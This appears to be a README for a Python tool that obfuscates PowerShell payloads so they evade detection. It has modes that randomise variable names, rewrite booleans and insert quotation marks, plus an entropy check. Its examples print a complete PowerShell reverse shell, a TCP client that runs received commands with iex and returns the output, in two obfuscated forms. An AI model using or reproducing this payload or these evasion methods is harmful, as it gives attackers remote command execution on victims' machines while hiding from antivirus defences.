# auto_powershell_obfuscation - Beta

## Description

An automated tool for obfuscation of a powershell script.
This tool is for experimental purposes, I am not responsible for your actions.

## Usage

```
python3 obfuscator.py -f <YOUR_PAYLOAD> -m <MODE>
```

```powershell
PS C:\auto_powershell_obfuscation> python3 .\obfuscator.py -f .\test_payload.txt
Payload 

$var = $True;$var2 = $False;

New Payload 

$f75fc1bb5c6b4553a485859901a9128f = (9999 -eq 9999);$34a7d89f45c847fc8527e8c646d0f69b = !![bool]$null;
```

## Mode

### Var

**var** mode only changes the names of your variables according to the entropy rules.

```powershell
PS C:\auto_powershell_obfuscation> python .\obfuscator.py -m var -f .\payload.txt 

$4fe310251c7d4c8f937142076d281ce6 = New-Object System.Net.Sockets.TCPClient('127.0.0.1',8181);$45cbaabdf14f45a191c972b6307a6abb = $4fe310251c7d4c8f937142076d281ce6.GetStream();[byte[]]$95c66e4518fc49bdbe1a369ca1fa4588 = 0..65535|%{0};while(($b9285b898cbe4628aa860f2608aa2195 = $45cbaabdf14f45a191c972b6307a6abb.Read($95c66e4518fc49bdbe1a369ca1fa4588, 0, $95c66e4518fc49bdbe1a369ca1fa4588.Length)) -ne 0){;$f26c594770184cb9ad926878184d061d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($95c66e4518fc49bdbe1a369ca1fa4588,0, $b9285b898cbe4628aa860f2608aa2195);$2031bb366ddb4bd0a88e411227464baa = (iex $f26c594770184cb9ad926878184d061d 2>&1 | Out-String );$5dc4676c22014043b312ff6e180ba5ff = $2031bb366ddb4bd0a88e411227464baa + 'PS ' + (pwd).Path + '> ';$5d584a8b541a4220b78f14b13a6c9ee9 = ([text.encoding]::ASCII).GetBytes($5dc4676c22014043b312ff6e180ba5ff);$45cbaabdf14f45a191c972b6307a6abb.Write($5d584a8b541a4220b78f14b13a6c9ee9,0,$5d584a8b541a4220b78f14b13a6c9ee9.Length);$45cbaabdf14f45a191c972b6307a6abb.Flush()};$4fe310251c7d4c8f937142076d281ce6.Close()
```

### Boolean

**boolean** mode replaces simple $True or $False with equivalent boolean expressions.

`$True` => `[bool]1254`

### Quote - Beta

**quote** mode will sprinkle your code with quotation marks where they don't disturb the flow (/!\ beware /!\ this mode is not completely finished, check that it works properly before using it)

```powershell
C:\auto_powershell_obfuscation> python .\obfuscator.py -m quote -f .\payload.txt

$client = New-Object Sys""t''em.Net.Sockets.TCPClient('127.0.0.1',8181);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (N''ew-Object -TypeName Sy''st''em.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (p""wd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Entropy

**entropy** mode allows you to calculate the entropy of your payload.

```powershell
C:\auto_powershell_obfuscation> python .\obfuscator.py -m entropy -f .\payload.txt

5.265027259625534
```
